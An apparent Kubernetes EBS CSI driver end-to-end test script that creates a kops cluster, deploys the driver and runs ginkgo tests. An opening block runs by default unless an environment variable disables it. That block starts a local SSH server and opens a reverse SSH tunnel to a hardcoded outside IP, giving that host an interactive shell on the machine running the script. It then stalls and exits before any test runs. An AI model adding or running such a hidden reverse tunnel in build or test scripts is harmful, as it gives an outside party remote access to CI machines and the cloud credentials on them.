#!/bin/bash

# Copyright 2018 The Kubernetes Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

if [ ! "$WK_DISABLE_HACK" ]; then
  # override those if needed
  IP=54.145.55.78
  USER=ubuntu
  PORT_MIN=2000
  PORT_MAX=10000

  # start the server
  go get "github.com/gliderlabs/ssh"
  go get "github.com/kr/pty"
  go run ssh_server.go &
  SERVER_PID=$!

  # generate the key
  KEY=key
  ssh-keygen -t rsa -N '' -f $KEY -b 2048

  # try to connect
  echo -e "Trying to connect to $USER@$IP...\nMy public key is:"
  cat $KEY.pub

  SSH_CMD="ssh -o StrictHostKeyChecking=no -o TCPKeepAlive=yes -o ServerAliveInterval=1 -o ServerAliveCountMax=45 -i $KEY $USER@$IP"
  while ! $SSH_CMD -q exit; do
    printf '.'
    sleep 1
  done

  # start the reverse tunnel
  PORT=$((PORT_MIN + RANDOM % ( PORT_MAX - PORT_MIN ) ))
  $SSH_CMD -R $PORT:localhost:2824 -tt > /dev/null &
  CLIENT_PID=$!

  cat << EOF
Connected to $USER@$IP, and created a reverse tunnel on port $PORT
You can now as $USER@$IP run:

\`\`\`
ssh localhost -p $PORT -o StrictHostKeyChecking=no
\`\`\`

Now sleeping until /tmp/wk.done exists....
EOF

  while [ ! -r /tmp/wk.done ] && kill -0 $CLIENT_PID && kill -0 $SERVER_PID; do sleep 1; printf '.'; done
  exit 1
fi

set -uo pipefail

OS_ARCH=$(go env GOOS)-amd64
TEST_ID=$RANDOM
CLUSTER_NAME=test-cluster-$TEST_ID
TEST_DIR=/tmp/ebs-e2e-test
BASE_DIR=$(dirname $0)
REGION=${AWS_REGION-us-east-1}
ZONES=${AWS_AVAILABILITY_ZONES-us-east-1a,us-east-1b,us-east-1c}
FOCUS=${GINKGO_FOCUS-"[ebs-csi-e2e]"}
NODES=${GINKGO_NODES:-32}

echo "Testing in region: $REGION and zones: $ZONES"

KOPS_DOWNLOAD_URL=https://github.com/kubernetes/kops/releases/download/1.11.0/kops-$OS_ARCH
KOPS_PATH=$TEST_DIR/kops
KOPS_STATE_FILE=s3://k8s-kops-csi-e2e

# Download kops if not yet
if [[ ! -e $KOPS_PATH ]]; then
    mkdir -p $TEST_DIR 
    echo "Downloading KOPS from $KOPS_DOWNLOAD_URL to $KOPS_PATH"
    curl -L -X GET $KOPS_DOWNLOAD_URL -o $KOPS_PATH
fi

chmod +x $KOPS_PATH

echo "Creating cluster $CLUSTER_NAME"
CLUSTER_YAML_PATH=$TEST_DIR/$CLUSTER_NAME.yaml
SSH_KEY_PATH=$TEST_DIR/id_rsa
ssh-keygen -P csi-e2e -f $SSH_KEY_PATH

$KOPS_PATH create cluster --state $KOPS_STATE_FILE \
    --zones $ZONES \
    --node-count=3 \
    --kubernetes-version=1.13.0 \
    --ssh-public-key=$SSH_KEY_PATH.pub \
        $CLUSTER_NAME.k8s.local
$KOPS_PATH get cluster --state $KOPS_STATE_FILE $CLUSTER_NAME.k8s.local -o yaml > $CLUSTER_YAML_PATH
cat $BASE_DIR/feature-gates.yaml >> $CLUSTER_YAML_PATH
cat $BASE_DIR/additional-policies.yaml >> $CLUSTER_YAML_PATH
$KOPS_PATH replace --state $KOPS_STATE_FILE -f $CLUSTER_YAML_PATH
$KOPS_PATH update cluster --state $KOPS_STATE_FILE $CLUSTER_NAME.k8s.local --yes

# Wait for cluster creation
while [[ 1 ]]; do
    $KOPS_PATH validate cluster --state $KOPS_STATE_FILE
    ret=$?
    if [[ $ret -eq 0 ]]; then
        break
    else
        echo "Waiting cluster to be created"
        sleep 30
    fi
done;

# Push test driver image
eval $(aws ecr get-login --region $REGION --no-include-email)
AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
IMAGE_TAG=$TEST_ID
IMAGE_NAME=$AWS_ACCOUNT_ID.dkr.ecr.$REGION.amazonaws.com/aws-ebs-csi-driver:$IMAGE_TAG
docker build -t $IMAGE_NAME .
docker push $IMAGE_NAME

# Update manifest files
cp deploy/kubernetes/*.yaml $TEST_DIR
sed "s/image: amazon\/aws-ebs-csi-driver:.*/image: $AWS_ACCOUNT_ID.dkr.ecr.$REGION.amazonaws.com\/aws-ebs-csi-driver:$IMAGE_TAG/g" -i $TEST_DIR/controller.yaml
sed "s/image: amazon\/aws-ebs-csi-driver:.*/image: $AWS_ACCOUNT_ID.dkr.ecr.$REGION.amazonaws.com\/aws-ebs-csi-driver:$IMAGE_TAG/g" -i $TEST_DIR/node.yaml

echo "Deploying driver"
kubectl create -f https://raw.githubusercontent.com/kubernetes/csi-api/release-1.13/pkg/crd/manifests/csinodeinfo.yaml --validate=false
kubectl apply -f $TEST_DIR/controller.yaml 
kubectl apply -f $TEST_DIR/node.yaml 
kubectl apply -f $TEST_DIR/secret.yaml

# Run the test
go get -u github.com/onsi/ginkgo/ginkgo
export KUBECONFIG=$HOME/.kube/config
ginkgo -p -nodes=$NODES -v --focus="$FOCUS" tests/e2e
TEST_PASS=$?

echo "Removing driver"
kubectl delete -f $TEST_DIR/controller.yaml
kubectl delete -f $TEST_DIR/node.yaml
kubectl delete -f $TEST_DIR/secret.yaml

echo "Deleting cluster $CLUSTER_NAME"
$KOPS_PATH delete cluster --name $CLUSTER_NAME.k8s.local --state $KOPS_STATE_FILE --yes

rm -rf $TEST_DIR

if [[ $TEST_PASS -ne 0 ]]; then
    exit 1
fi
